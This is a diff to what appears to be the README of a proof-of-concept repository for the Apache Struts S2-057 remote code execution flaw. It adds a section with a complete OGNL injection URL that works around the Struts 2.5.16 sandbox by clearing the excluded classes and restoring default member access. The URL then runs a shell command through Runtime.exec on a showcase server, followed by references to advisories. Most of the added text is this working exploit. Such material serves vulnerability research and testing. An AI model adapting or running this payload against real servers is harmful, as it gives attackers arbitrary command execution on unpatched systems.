@@ -149,10 +149,24 @@ http://www.canyouseeme.cc/struts3-showcase/%24%7B%28%23_memberAccess%5B%22allowS
 ```
 ![](./linux.png)
 
+# 0x07 Bypass for struts-2.5.16-all.zip
 
-# 0x07 参考链接
+参考链接：https://otakekumi.github.io/2018/08/25/S2-057-%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E3%80%81%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E5%8F%8AEXP%E6%9E%84%E9%80%A0/
+
+Poc for Example-Linux Docker:
+
 
 ```
+http://www.canyouseeme.cc:44449/struts2-showcase/actionchaining/$%7B(%23ct=%23request['struts.valueStack'].context).(%23cr=%23ct['com.opensymphony.xwork2.ActionContext.container']).(%23ou=%23cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(%23ou.setExcludedClasses('java.lang.Shutdown')).(%23ou.setExcludedPackageNames('sun.reflect.')).(%23dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(%23ct.setMemberAccess(%23dm)).(%23cmd=@java.lang.Runtime@getRuntime().exec('touch /tmp/jas502n'))%7D/actionChain1.action
+
+```
+![](./struts-2.5.16-poc.jpg)
+![](./struts-2.5.16-rce.jpg)
+
+# 0x08 参考链接
+
+```
+https://otakekumi.github.io/2018/08/25/S2-057-%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E3%80%81%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E5%8F%8AEXP%E6%9E%84%E9%80%A0/
 https://github.com/vulhub/vulhub/tree/master/struts2/s2-048
 https://lgtm.com/blog/apache_struts_CVE-2018-11776
 https://cwiki.apache.org/confluence/display/WW/S2-057
